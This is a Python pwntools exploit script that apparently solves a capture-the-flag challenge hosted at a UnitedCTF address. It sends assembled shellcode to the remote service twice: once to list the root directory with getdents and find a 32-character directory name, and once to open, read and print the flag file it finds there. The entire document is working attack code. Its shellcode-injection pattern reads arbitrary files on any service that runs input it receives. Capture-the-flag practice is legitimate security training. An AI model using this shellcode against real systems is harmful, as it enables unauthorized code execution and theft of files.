#!/usr/bin/python3
from pwn import *

context.clear(arch="amd64")

RHOST, RPORT = "nc.ctf.unitedctf.ca", 6003
SIZE = 0x240

shellcode = "\n".join(
    [
        shellcraft.open("/", constants.O_DIRECTORY),
        shellcraft.getdents("rax", "rsp", SIZE),
        shellcraft.write(constants.STDOUT_FILENO, "rsp", SIZE),
    ]
)

r = remote(RHOST, RPORT)
r.recvuntil(b"> ")
r.sendline(asm(shellcode))
directories = dirents(r.recv(SIZE))
dirname = [d for d in directories if len(d) == 32][0]
filepath = f"/{dirname}/flag"
r.info(f"flag @ {filepath}")

shellcode = "\n".join(
    [
        shellcraft.open(filepath, constants.O_RDONLY),
        shellcraft.read("rax", "rsp", 128),
        shellcraft.write(constants.STDOUT_FILENO, "rsp", 128),
    ]
)

r = remote(RHOST, RPORT)
r.recvuntil(b"> ")
r.sendline(asm(shellcode))
r.success(r.recvline().decode())
